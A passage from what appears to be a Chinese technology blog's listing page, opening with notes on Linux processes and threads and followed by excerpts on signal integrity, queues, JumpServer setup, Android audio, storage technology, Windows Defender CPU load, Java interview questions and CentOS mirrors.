我们可以在当前进程中，利用fork函数创建子进程，我们的进程具有独立性，创建的子进程通过拷贝父进程的PCB，再更具自己的情况，稍加更改，就成了自己的PCB结构体，因此在父进程在创建子进程前的一些属性和数据，例如文件描述符表等子进程都是可以看见的。当然子进程也会创建出自己的进程地址空间。只不过为了提高效率，节约内存其采用读时共享，写时拷贝的策略，在读时，和父进程映射同一块物理内存，只有写时，才会重新将数据映射到心的物理内存上。
新创建出来的子进程，若我们不进行等待，就会形成僵尸进程，僵尸进程会占用一定的资源，我们的子进程在退出时，其会保留一些退出信息，当然由于进程并未完全退出，所以其PCB当然也存在在内核中，所以为了减少资源的浪费，我们要对子进程进行回收，回收可以采用父进程阻塞式的等待，父进程进行轮询判断等方式进行回收，还可以通过信号的方式：因为我们的子进程在退出时，会像父进程发送SIGCHILD信号，所以我们若不关心退出信息，可以通过显式的忽略该信号（特例），关心的话可以在自定义信号处理函数中进行等待（循还+非阻塞式等待）。
我们在的进程还可以进行替换，利用execv函数族进行进程替换，其本质就是将该进程的代码和数据进行替换，PCB等结构不变。
进程终止我们可以通过exit函数，信号，直接return等方式进行退出。
线程 什么叫线程？
线程是OS进行调度运行的最小单位，线程运行在进程的内部，是进程实际运行的单位。进程是承担OS资源的实体，那么线程就是承担进程部分资源的一个实体。
在一个进程内部，不止有一个进程，那么我们是不是要对其进行管理，先描述，后组织，将其属性抽象从某种结构体，我们将这种结构体成为TCB。也就是说，OS实际调度的是一个个TCB，当然这是对于一般OS来说。Linux有自己的方案。
Linux认为既然线程的结构和进程类似，那么我就不用去再实现线程的一套结构，而是将一个线程当作一个特殊的进程来看待，这样的优势则是，减少了我们结构的复杂度，从而降低了BUG的产生。
因此，现在对于CPU而言，其不管你是线程还是进程，它所认的就是PCB结构体。
为了能够实现线程，我们就要将原来进程的那一套进行一些更改。这就涉及到了线程的一些特性。我们的同一个进程的多个线程之间是能够共享代码段，数据段，打开的文件等资源的，也就是说其要共享进程地址空间上的一些数据。这当然好办，我们在创建这个特殊的进程时，将其和创建它的进程的地址空间进行共享。
当然除了共享的数据以外，每个线程都是一个执行流，它也应该拥有自己的私有栈，独立的上下文数据，信号屏蔽字，线程ID，调度优先级等。后面的一些数据，由于线程有独立的PCB，因此可以私有化，但是，栈怎么办？用户栈只有一个，要是都放在用户栈里，岂不是太过于混乱。Linux的解决办法是这样的：此时，我们的线程对于上层用户来说，操作是有难度的，所以有第三方库经过对Linux 的线程接口封装为我们提供了使用Linux线程更方便的方法，在使用线程时，程序运行起来后，会将第三方库加载到我们的mmp共享区域，这个库不光为我们解决了使用线程系统调用接口难的问题，还帮我们提供了线程所使用的栈。这个栈在哪呢？就在我们的mmp中，并且我们的线程id就是其栈的起始地址，而我们ps -aL中显式的LWP则是内核中标记线程的id。它与我们用户所看到的线程id是一一对应的。
所以Linux下的进程&lt;=其他OS下的进程。OS下的进程我们称为轻量级进程。
进程与线程比较 进程承担OS资源分配的实体，而线程是CPU的基本调度单位，线程在进程中。
线程之间大多数资源是共享的，所以线程间通信方便，而进程是独立的，所以进程间通信难度较大。
线程能够减少并发执行的时间和空间开销-----体现在：
线程的创建更加简单。
线程进行切换时效率更快。因为我们在进行切换时，不仅仅是将PCB换下去，保存上下文，我们的计算机为了更快的效率，在CPU和内存之间还由多级缓存，我们的线程中的资源好多都是共享的，所以缓存命中率高，而进程切换，则需要重新加载缓存。
线程的释放也要比进程快。
但是我们同一进程内的线程异常退出，那么我们整个进程也都退出了，而且线程由于一些数据共享的问题，会带来线程安全。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2084d29c828e1a70e7882c34e399024a/" rel="bookmark">
			混合预编码(Hybrid Precoding)的全连接结构与子连接结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 A Survey on Hybrid Beamforming Techniques in 5G: Architecture and System Model Perspectives 全连接结构的混合预编码
子连接结构的混合预编码
Alternating Minimization Algorithms for HybridPrecoding in Millimeter Wave MIMO Systems 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/569410dced7db0ebc81ed534d1856d5f/" rel="bookmark">
			信号完整性分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录 前言一、信号完整性SI1.1 信号失真1.2 串扰1.3 衰减 二、电源完整性PI2.1 地弹2.2 电源轨道塌陷 三、电磁兼容EMC3.1 电磁干扰EMI3.2 电磁抗扰度EMS 前言 本篇介绍信号完整性分析的知识体系，以及部分分析方法。
什么是信号完整性?通俗来讲，信号在互连线的传输过程中，会受到互连线等因素的相互作用而使得信号发生波形畸变的一种现象，这时可以说信号在传输中被破坏了，变得“不完整”。信号完整性没有一个唯一的规范定义，从广义上讲，指的是信号在高速产品中由互连线引起的所有问题。
为什么研究信号完整性？在低速信号中，一个干扰占据脉冲的时间很短。随着科技水平迅速发展，芯片频率和信号传输速率不断提高，核心电压越来越低，噪声容限降低，对信号完整性的要求越来越高。所以需要对高频（100MHz以上）产品（如DDR、HDMI等）的信号质量要严格把控，对于弱电项目，主要是PCB上信号的处理。
怎么研究信号完整性？首先在设计之初，就要把信号完整性分析考虑进去。然后利用专门的仿真工具，如电磁仿真（Ansys HFSS、Keysight ADS、Hyperlynx）、电路仿真（LTSpice、PSPice、Tina、Multisim）、数值计算（SI9000、Saturn PCB Toolkit、EDA自带工具、在线计算工具），进行系统建模，最后使用阻抗分析仪、矢量网络分析仪、时域反射计等进行测量。
最后有哪些研究方向和需要什么基础知识？主要有三大研究领域，分别为：信号完整性SI、电源完整性PI和电磁兼容EMC。在研究这些方向，我们需要了解信号的时域和频域（周期、频谱、带宽、傅里叶变换等）、阻抗以及传输线（串扰、差分线、衰减等等）
一、信号完整性SI 1.1 信号失真 控制阻抗阻抗匹配 1.2 串扰 增大线间距 1.3 衰减 短而宽的连线低介电常数PCB材料 二、电源完整性PI 2.1 地弹 减小返回路径电感
2.2 电源轨道塌陷 电源轨道上的电压变化降低电源分配网络阻抗 三、电磁兼容EMC 3.1 电磁干扰EMI EMI为机器本身在执行应有功能的过程中所产生不利于其他系统的电磁噪声
传导干扰RE辐射干扰CE
减小地阻抗，减小共模电流
谐波电流测量，电压波动和闪烁测量 3.2 电磁抗扰度EMS EMS指机器在执行应有功能的过程中不受周围电磁环境影响的能力
辐射抗扰度RS（Radiated Susceptibility）传导抗扰度CS（Conducted Susceptibility）静电放电抗扰度ESD（Electrostatic discharge)电快速瞬变脉冲群EFT/Burst（Electrical fast transient burst)无线电频率干扰RFI（Radio Frequency Interference)浪涌抗扰度Surge工频磁场抗扰度PFMF
滤波，屏蔽 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df65e0f8ab6163d742f4c98e453a4780/" rel="bookmark">
			数据结构——队列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、队列的定义
二、队列的实现
1. 队列的顺序存储结构
1.1. 顺序队
1. 创建顺序队
2. 删除顺序队
3. 判断队列是否为空
4. 判断队列是否已满
5. 入队
6. 出队
7. 获取队列长度
8. 获取队首元素 1.2. 环形队
1. 创建环形队
2. 删除环形队
3. 判断环形队列是否为空 4. 判断环形队列是否已满
5. 入队
6. 出队
7. 获取队列长度
8. 获取队首元素
2. 队列的链式存储结构
1. 创建链队
2. 删除链队
3. 判断链队是否为空
4. 入队
5. 出队
6. 获取队首元素
7. 获取链队长度 三、队列的应用
1. 银行业务队列简单模拟
2. 求解迷宫从入口到出口的一条最短路径
四、总结
一、队列的定义 队列中的数据元素的逻辑关系呈线性关系，可以说队列也是一种线性表，队列可以像线性表一样采用顺序存储结构存储，也可以使用链式存储结构进行存储。使用顺序存储结构的队列称为顺序队，使用链式存储结构的队列称为链队。
队列和栈类似，栈只能在一端进行删除和插入操作，而队列也是一种操作受限的线性表，其限制为仅允许在表的一端进行插入操作，而在表的另一端进行删除操作。进行插入的一端称为队尾，进行删除的一端称为队首。向队列中插入新元素称为进队或入队，新元素进入队列后就成为新的队尾元素；从中删除元素称为出队或离队，元素出队后，其直接后继元素就成为队首元素。如下图所示。
二、队列的实现 1. 队列的顺序存储结构 队列使用顺序存储结构存储相对比较简单，操作和栈类似，但有几点地方需要注意，队列有两端可以操作，需要两个指针或索引，队列是否为空和入队和出队需要队考虑几种情况。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df65e0f8ab6163d742f4c98e453a4780/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2e1c93d9334a249118bd8d87e8cde1c/" rel="bookmark">
			文件工具类(工作案例)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文件工具类(工作案例)
代码如下：
public class FileUtils { //日志 private static final Logger LOGGER = LoggerFactory.getLogger(FileUtils.class); //文件缓冲区的长度 public static final int BUFFERSIZE = 8192; /** * 说明：将字符串写入一个文件中 * * @param filename 文件名：绝对路径 * @param is 输入流 * @return */ public static boolean writeFile(String filename, InputStream is) { //文件输出流 FileOutputStream fos = null; try { fos = new FileOutputStream(filename); int len; byte[] buffer = new byte[BUFFERSIZE]; while ((len = is.read(buffer, 0, BUFFERSIZE)) !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2e1c93d9334a249118bd8d87e8cde1c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf8b8bacf06b50a6c1562fb993aefae8/" rel="bookmark">
			JumpServer初探
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JumpServer资产，用户关系如图所示。
资产管理下有资产列表和系统用户，系统用户分为特权用户和普通用户。资产列表下管理的是服务器，而特权用户就是JumpServer用来登录服务器的账号，因此特权用户需要拥有较高的权限，比如root账号或能执行sudo的管理员账号，而且需要配置密码。JumpServer会用这个账号来登录和管理对应的服务器资产。在资产列表中添加资产时配置的特权用户就来自与这里。
用户管理下的用户列表是用来登录JumpServer的账号。但是这个账号还无法直接登录服务器，因为他是配置在JumpServer数据库的，和服务器没关系。
在资产管理的系统用户下，除了特权用户，还有普通用户，他是可以用来登录服务器的。只要将这里的普通用户和JumpServer的用户关联起来，那么JumpServer的用户就可以登录服务器了，如果再把资产列表中的服务器关联起来，就能实现登录权限管理，这就是资产授权的作用。
搞清楚这些概念以及它们之间的关系之后，做为JumpServer的管理员，要为一个人开通登录服务器的权限需要以下步骤。
第一步：新建JumpServer用户
在用户管理→用户列表下新建用户。来源哪里选数据库，其他没什么要特别注意的地方。
第二步：新建特权用户
在资产管理→系统用户下切换到特权用户，创建一个管理员账号，并填写密码。
第三步：添加资产
在资产管理→资产列表创建一个资产，其中特权用户栏选择上一步创建的管理员账号，这个管理员账号要能够登录这台服务器。
如果已有资产，可以点击更新设置特权用户。正常情况下，资产列表的“可连接”列为绿色勾勾，这就说明JumpServer通过特权用户成功登录并获取了服务器信息。
如果服务器”可连接“状态为红色叉叉，说明没有配置特权用户或者配置不对，可能是用户名或密码不对，修改后如果还是显示红色叉叉，可以点击表格左上角刷新按钮。如果刷新无效，可以点击表格中的主机名，这是一个链接，到资产详情页，右边有一个快速更新的模块，分辨点击这两个刷新按钮，看到OK后关掉，再回到资产列表，应该就能看到”可连接“状态变为绿色叉叉，并且服务器信息页成功显示出来了。
第四步：新建普通用户
在资产管理→系统用户下的普通用户页，创建一个普通用户。协议选择SSH，名称随意，用户名是用来登录服务器的用户名。认证方式选择托管密码，并打开自动生成，然后打开自动推送开关。
这样设置之后，就不需要事先在服务器上创建对应账号了，JumpServer会自动帮你创建账号，输入密码。效果就是登录JumpServer后点击web终端就能直接登录服务器，不需要再输入密码。当然，这一切的前提是还需要最后一步授权管理。
第五步：资产授权
在权限管理→资产授权中新建一条授权规则。在”用户“栏选择的是JumpServer的用户，也就是第一步创建的用户，”资产“栏也有系统用户选择，这里选的是第四步创建的用户，然后在资产栏选择运行访问的资产，这样一条授权规则就创建好了，他将JumpServer用户，服务器和服务器账户关联了起来。
资产也可以按树形结构分类管理，也就是我们说的业务树。在授权时，不选择具体的资产，而是在节点栏选择业务树，这样当业务树上机器发生变化时，不需要重新设置权限。
第六步：登录服务器
管理员的操作到此结束，可以退出登录了，然后用第一步创建的账号登录JumpServer。在我的资产页可以看到上一步授权的服务器，点击操作栏的终端按钮就可以跳转到web终端页面了。也可以直接访问堡垒机的 /luna 路径，直接就到web终端了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23e6d5262ee2c76cb03c6d18e34f5edb/" rel="bookmark">
			SpringBoot 的 测试类的猫腻
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 出于打包和效率的考虑，项目上的代码都没有 测试类。在我决定自己写个测试类方面调试时，确发现，自己的测试类竟然无法自动注入Spring容器的bean。⊙(・◇・)？
测试类的目录结构
原始代码（不可运行） 代码简化，大致就是这个样子。
import com.ajxt.ppd.dao.PpdContractApplyMapper; import com.ajxt.ppd.po.PpdContractApply; import org.junit.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest public class AppTest { @Autowired private PMapper pMapper; @Test public void tetst(){ P hhh = pMapper.selectByPrimaryKey("hhh"); System.out.println(hhh); } } 运行结果，pMapper 直接报了空指针！what fuck？
可运行代码 没办法，只好请教项目组的老大哥帮忙了。然后，他给出了他的测试代码。
什么鬼？@RunWith？测试类还要加这个?
import com.ajxt.ppd.dao.PpdContractApplyMapper; import com.ajxt.ppd.po.PpdContractApply; import org.junit.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; import org.junit.runner.RunWith; import org.springframework.test.context.junit4.SpringRunner; @RunWith(SpringRunner.class) @SpringBootTest public class AppTest { @Autowired private PMapper pMapper; @Test public void tetst(){ P hhh = pMapper.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23e6d5262ee2c76cb03c6d18e34f5edb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87d3007521a8531840bf079464669e22/" rel="bookmark">
			深度好文 | Android高性能音频解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.引言
1.1目的和对象
该文档用于Android音频流畅性，聚焦优化音频卡顿、杂音问题。适用于Android音频开发人员查看。
1.2背景
游戏、k歌、直播等一些使用场景，音频对时延有较高的要求，保障低延迟，就需要更小的buffer，降低整个链路数据传递时延，但是抗性能抖动能力就会下降。如果音频线程CPU调度延迟，生产数据不及时，系统就会错过buffer周期，产生补0噪声。
一方面，Android音频系统框架对于音频性能策略设计偏保守，没有提供类似IOS，Windows系统那样的一套API 用于标记音频线程，系统也就不知道APP的线程哪些是音频线程，哪些不是。无法对APP音频线程在CPU资源上做一些适度地倾斜。
另一方面，Android生态控制力较弱，多数APP在音频逻辑的实现过程中，忽略了CPU调度因素，没有按照Google的建议设置音频线程的优先级，也就是默认的优先级（Nice 120）。在整机CPU重载场景下，APP内部音频关联线程，特别是解码器线程CPU调度延迟，导致数据生产不及时，触发声音卡顿、杂音问题，这样的问题越来越突出。
一些APP在实现过程中，在关键的播放线程中，调用AudioManager耗时接口，阻塞了数据传递，导致了声音卡顿。
还有一些应用面在主线程/UI渲染线程中，调用Audio的耗时接口，导致游戏画面渲染帧率降低。
与APP开发伙伴交流过程中，发现APP开发者和系统开发者，存在一些理解上的GAP，APP开发者对音频系统不熟悉，而系统开发者对APP内部业务逻辑不熟悉。遇到问题debug起来，耗时较长，不利于提升用户体验。音频流畅性体验是Android基础体验的一个核心，也是一个痛点。本文聚焦音频流畅性分析，希望能有助于音频APP开发者和音频系统开发者联合调优，提升用户音频基础体验。
1.3音频格式
人耳的听觉范围是在20Hz到20KHz之间的频段，不同于人眼的“暂留”生理特性，人耳鼓膜的灵敏度远高于人眼。两耳间距产生的微秒级时延（700us）带来的细微声压、声相变化，可辨别远处的音源方位。普通人可清晰辨识低至10db的响度变化，经过专业训练的“金耳朵”，可识别更低db的响度变化，人耳对时延敏感，对声音卡顿敏感。这也是音频采样率(48000 fps)远高于画面的帧率（60 fps）的原因。通过大幅增加音频流采样次数，使得响度曲线变化更平滑，避免出现邻帧之间有较大的db变化，避免听觉上不适感。
声道数：声场还原，主要用于表达声音方位立体感。例如 单声道(1ch，mono)，双声道立体声（2ch，stereo），5.1声道, 7.1声道
图1.1 室内5.1声道声场还原
位宽：也称位深，即一个采样点用几个字节编码
表1.1 PCM编码类型
音频帧：即一个采样点，音频帧大小计算方法：声道数据 * 位宽，例如：
16bit，2ch 音乐，它的音频帧大小为：2 * 2 = 4 字节。
32bit，5.1ch 音乐，它的音频帧大小为：4 * 6 = 24 字节。
采样率：也称音频帧率fps，每秒需要取样多少次，一个采样点就是一个音频帧。通过采样对模拟型号离散化成数字信号，采样率越高，声音信息越丰富。人耳听觉频段范围限制，无法听到低频声音，Android支持的采样率通常范围在闭区间[8000HZ, 384000HZ]。
Android最常见采样率：
通话：8k，16k, 32k
视频及游戏：24k, 44.1k，48k
高清音乐：96k, 192k
图1.2 采样与量化
音频需要足够高的采样率，使得数据更平滑。
码率：1秒时间播放了多少字节数据（或多少bit数据）。
计算公式：bRate = 采样率 * 位宽 * 声道数
例如 48k，7.1声道，16bit pcm编码 码率为：48000 * 8 * 2 = 768000 Bps
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/87d3007521a8531840bf079464669e22/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4aecf66e992cdd3ea559f84aca24215c/" rel="bookmark">
			自下而上-存储全栈（TiDB/RockDB/SPDK/fuse/ceph/NVMe/ext4）存储技术专家成长路线
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数字化时代的到来带来了大规模数据的产生，各行各业都面临着数据爆炸的挑战。 随着云计算、物联网、人工智能等新兴技术的发展，对存储技术的需求也越来越多样化。不同应用场景对存储的容量、性能、可靠性和成本等方面都有不同的要求。具备存储技术知识和技能的人才更具有竞争力。
存储技术专家成长路线 技术点主要运用在存储库架构设计、企业级存储系统、分布式存储系统、云存储系统、分布式数据库、高性能存储引擎、文件系统等领域。
1.接口驱动层 在存储开发中，接口驱动层是指用于访问和操作底层存储系统的软件层。它提供了标准化的接口规范，使应用程序能够对存储设备进行读取、写入、管理和配置等操作。
NVMe（Non-Volatile Memory Express 是一种高性能、低延迟的存储接口协议，专门为固态硬盘（SSD）设计而开发的。）SATA（Serial Advanced Technology Attachment 是一种串行的计算机总线接口，广泛应用于存储设备、光驱、显卡等各种计算机硬件中。在存储开发中的作用是提供基本的存储接口、提供高带宽传输、兼容性强和价格低廉。）SCSi（Small Computer System Interface 是一种用于计算机和外部设备间进行数据传输的接口标准。提供高性能数据传输，支持多设备连接，提供高可靠性和冗余性，并具有高度灵活性。）RDMA（Remote Direct Memory Access 是一种数据传输机制，允许两个计算机在不使用CPU的情况下直接从彼此的内存中读取和写入数据。在存储开发中的作用是降低延迟、提高吞吐量，提升存储性能，增强可靠性和数据完整性，并简化存储网络架构。） 2.内核层 内核层通常指的是存储软件的核心组成部分，即负责实现存储系统的基本功能和服务的程序模块。内核层通常包含多个子模块，例如文件系统、卷管理、快照、克隆、数据保护和恢复等，这些子模块共同构成了存储系统的核心。
ext4（第四扩展文件系统，是Linux操作系统中常用的一种文件系统。学习ext4文件系统可以帮助存储开发人员更好地理解和应用文件系统相关的技术和原理，从而提升存储系统的性能、可靠性和扩展性。）xfs（XFS是一种高性能的文件系统，学习XFS可以帮助理解和应用高性能、大规模数据管理、可靠性和扩展性等方面的知识）btrfs（Btrfs是一种先进的Linux文件系统，它的全称是B-tree file system。Btrfs采用了许多先进的技术，如快照、校验和、多设备支持等，可以提供出色的性能、可靠性和灵活性。学习Btrfs可以帮助掌握先进的存储技术、理解大规模数据管理、实现快照和备份、保护数据完整性等方面的知识。这些都是构建高效、可靠的存储系统所必需的技能和知识。）procfs（procfs是一个虚拟的文件系统，用于提供有关系统和进程状态的动态信息。学习procfs可以更好地理解和管理存储系统。）tracefs（tracefs是一个用于跟踪和调试内核的文件系统。它提供了一种方便的机制来跟踪和调试内核函数的执行流程和性能数据，可以帮助存储开发人员解决内核相关的问题、优化存储系统的性能，并验证功能的正确性。）项目:无存储文件系统Kingfs项目: nvme文件系统zerofs 3.vfs VFS（Virtual File System，虚拟文件系统）是一个抽象层，用于在操作系统中统一管理不同的文件系统类型和访问方式。它是操作系统内核中的一部分，提供了对文件和文件系统的抽象接口，使得应用程序可以通过统一的方式来访问各种不同类型的文件系统。
学习VFS可以帮助理解和支持多种文件系统类型，简化文件系统与存储系统的交互方式，优化文件系统的性能，以及调试和开发文件系统。
io_uring
io_uring 是一个 Linux 内核提供的异步 I/O 框架，它旨在提供高性能和低延迟的 I/O 操作。io_uring 的设计目标是为用户空间程序提供一种高效的异步 I/O 接口，以取代传统的阻塞式 I/O 和其他异步 I/O 接口的局限性。
通过使用 io_uring，开发人员可以利用其高性能、低延迟和异步并行的特性来优化应用程序的 I/O 操作。它适用于需要处理大量 I/O 的场景，例如数据库、文件服务器、网络服务器等。同时，io_uring 的设计和接口相对简洁，易于使用和理解，使开发人员能够更容易地编写高效的异步 I/O 程序。
io_uring异步iocq与sq的运行原理无锁队列io_uring的setup/enter/registerliburing的开发库liburing接口与psync接口的关系内存映射IO (mmap)零拷贝psync与io_uring的iops性能对比io_uring与epoll的qps对比项目：实现tcp+io_uring fuse
FUSE（Filesystem in Userspace）是一个在用户空间实现文件系统的框架。它允许开发人员通过编写用户空间程序来创建自定义的文件系统，而无需修改操作系统内核。
帮助理解实现灵活的存储系统、定制化的数据管理逻辑，掌握文件系统操作和性能优化的技巧，并具备跨平台开发的能力。
fuse的运行原理fuse内核模块libfuse的开发库fuse_operation结构体分析实现fuse文件系统项目：fuse与opencv实现图片加水印 4.SPDK SPDK（Storage Performance Development Kit）是一个用于构建高性能存储应用程序的开源软件开发工具包。它专注于利用现代硬件和存储技术的特性，以最大化存储应用程序的性能。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4aecf66e992cdd3ea559f84aca24215c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08b4dbb88580440c6b4a9e6feb35046c/" rel="bookmark">
			解决 Antimalware Service Executable 导致 win10 CPU 占用过高的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 最近 CPU 总是莫名其妙的负载颇高。排查发现是 Antimalware service executable 服务在作祟。
Antimalware Service Executable 是什么 Antimalware Service Executable 是一个 Windows 安全进程，它执行针对恶意软件的实时保护。
Antimalware Service Executable 也被称为 msmpeng.exe，在后台运行，因此它可以不时地检测文件和程序。
当它检测到病毒或其他恶意攻击时，它会删除或隔离它们。
解决办法 问题原因：Windows defender 实时扫描硬盘文件，导致 CPU 负载大。
解决办法：
在设置中关闭实时更新，但收效甚微，因为只能暂时关闭，它会自动打开。（没用）禁止实时扫描，并通过任务计划安排 Windows defender 扫描的时机（太麻烦）组策略彻底关闭实时扫描（太麻烦）彻底关掉 Windows defender，通过小工具一键关闭（电脑裸奔）安装火绒，火绒的病毒服务会自动替代掉 window defender 的病毒防护服务，并且火绒负载很小 此操作最简单，突出一个有手就行不是 Windows defender 不好用，而是火绒更有性价比。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38a90f568358aff4ae1c7dc405bad35b/" rel="bookmark">
			Java面试高频题汇总：微服务篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面试官：Spring Cloud 5大组件有哪些？ 候选人：
早期我们一般认为的Spring Cloud五大组件是
Eureka : 注册中心Ribbon : 负载均衡Feign : 远程调用Hystrix : 服务熔断Zuul/Gateway : 网关 随着SpringCloudAlibba在国内兴起 , 我们项目中使用了一些阿里巴巴的组件
注册中心/配置中心 Nacos负载均衡 Ribbon服务调用 Feign服务保护 sentinel服务网关 Gateway 面试官：服务注册和发现是什么意思？Spring Cloud 如何实现服务注册发现？ 候选人：
目录
面试官：Spring Cloud 5大组件有哪些？
面试官：服务注册和发现是什么意思？Spring Cloud 如何实现服务注册发现？
面试官：我看你之前也用过nacos、你能说下nacos与eureka的区别？
面试官：你们项目负载均衡如何实现的 ?
面试官：Ribbon负载均衡策略有哪些 ?
面试官：什么是服务雪崩，怎么解决这个问题？
面试官：你们的微服务是怎么监控的？
面试官：你们项目中有没有做过限流 ? 怎么做的 ?
面试官：限流常见的算法有哪些呢？
面试官：为什么分布式系统中无法同时保证一致性和可用性？
面试官：什么是BASE理论？
面试官：你们采用哪种分布式事务解决方案？
面试官：分布式服务的接口幂等性如何设计？
面试官：xxl-job路由策略有哪些？
面试官：xxl-job任务执行失败怎么解决？
面试官：如果有大数据量的任务同时都需要执行，怎么解决？
我理解的是主要三块大功能，分别是服务注册 、服务发现、服务状态监控
我们当时项目采用的eureka作为注册中心，这个也是spring cloud体系中的一个核心组件
服务注册：服务提供者需要把自己的信息注册到eureka，由eureka来保存这些信息，比如服务名称、ip、端口等等服务发现：消费者向eureka拉取服务列表信息，如果服务提供者有集群，则消费者会利用负载均衡算法，选择一个发起调用服务监控：服务提供者会每隔30秒向eureka发送心跳，报告健康状态，如果eureka服务90秒没接收到心跳，从eureka中剔除 面试官：我看你之前也用过nacos、你能说下nacos与eureka的区别？ 候选人：
我们当时xx项目就是采用的nacos作为注册中心，选择nacos还要一个重要原因就是它支持配置中心，不过nacos作为注册中心，也比eureka要方便好用一些，主要相同不同点在于几点：
共同点： Nacos与eureka都支持服务注册和服务拉取，都支持服务提供者心跳方式做健康检测Nacos与Eureka的区别 ①Nacos支持服务端主动检测提供者状态：临时实例采用心跳模式，非临时实例采用主动检测模式
②临时实例心跳不正常会被剔除，非临时实例则不会被剔除
③Nacos支持服务列表变更的消息推送模式，服务列表更新更及时
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/38a90f568358aff4ae1c7dc405bad35b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/85c6aa20994fd8bc45e7fb5d88274fe1/" rel="bookmark">
			2024年CentOS镜像下载地址，包括CentOS官网、国内镜像下载，超详细教学，小白也能学会。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.CentOS官网镜像下载
1.1进入CentOs官网镜像下载地址
1.2找到需要下载的版本
1.3选择isos镜像文件夹
1.4选择架构
1.5下载种子文件
2.阿里云开源镜像站下载
2.1进入阿里云开源镜像站下载地址
2.2找到需要下载的版本
2.3选择isos镜像文件夹
2.4选择架构​
2.5下载种子文件
3.网易开源镜像下载
3.1进入网易开源镜像下载地址
​3.2找到需要下载的版本
3.3选择isos镜像文件夹
3.4选择架构​
3.5下载种子文件
4.搜狐开源镜像下载
4.1进入搜狐开源镜像下载地址
4.2找到需要下载的版本
4.3选择isos镜像文件夹
4.4选择架构​
4.5下载种子文件
这里给大家提供了4种镜像下载地址，包括CentOS官方镜像下载、阿里云开源镜像站下载、网易开源镜像下载搜狐开源镜像下载。 1.CentOS官网镜像下载 因为服务器在国外所以打开CentOS官方网站的时候可能会比较慢。大家可以选择后面几种国内镜像下载方式。
1.1进入CentOs官网镜像下载地址 https://vault.centos.org/
1.2找到需要下载的版本 比如我们要下载CentOS 6.5则点击6.5。
1.3选择isos镜像文件夹 点击isos文件夹。
1.4选择架构 选择架构，目前常用的都是x86_64位，所以这里我们选择x86_64文件夹。
1.5下载种子文件 一般选择DVD格式的镜像进行下载，因为是CentOS官方镜像下载，会存在下载慢的情况，这里我们下载​CentOS-6.5-x86_64-bin-DVD1to2.torrent​。
torrent是种子文件，下载完毕后，用迅雷这类下载工具打开。
CentOS-6.5-x86_64-bin-DVD1.iso：​DVD1主要的centos系统和部分必需的软件包。
CentOS-6.5-x86_64-bin-DVD2.iso：DVD2就是些额外的软件包。
分成2个的原因是因为刻录光盘的文件不能超过4.7G，而centos自带的软件包就超过了这个限制，所以为了方便刻录，就分成了两个文件。
这里我们一般选择下载DVD1即可。
2.阿里云开源镜像站下载 2.1进入阿里云开源镜像站下载地址 https://mirrors.aliyun.com/centos/
2.2找到需要下载的版本 这种情况说明这个版本的镜像没有提供下载。
这种情况有isos文件夹则有提供下载。
2.3选择isos镜像文件夹 同CentOS官方镜像下载一样这里点击isos文件。 2.4选择架构 2.5下载种子文件 torrent是种子文件，下载完毕后，用迅雷这类下载工具打开。
CentOS-6.5-x86_64-bin-DVD1.iso：​DVD1主要的centos系统和部分必需的软件包。
CentOS-6.5-x86_64-bin-DVD2.iso：DVD2就是些额外的软件包。
分成2个的原因是因为刻录光盘的文件不能超过4.7G，而centos自带的软件包就超过了这个限制，所以为了方便刻录，就分成了两个文件。
我们一般选择下载DVD1即可。
3.网易开源镜像下载 3.1进入网易开源镜像下载地址 http://mirrors.163.com/centos/
3.2找到需要下载的版本 这种情况说明这个版本的镜像没有提供下载。
这种情况有isos文件夹则有提供下载。
3.3选择isos镜像文件夹 同CentOS官方镜像下载一样这里点击isos文件。
3.4选择架构 3.5下载种子文件 torrent是种子文件，下载完毕后，用迅雷这类下载工具打开。
	</div>
	<div class="list__footer clearfix">
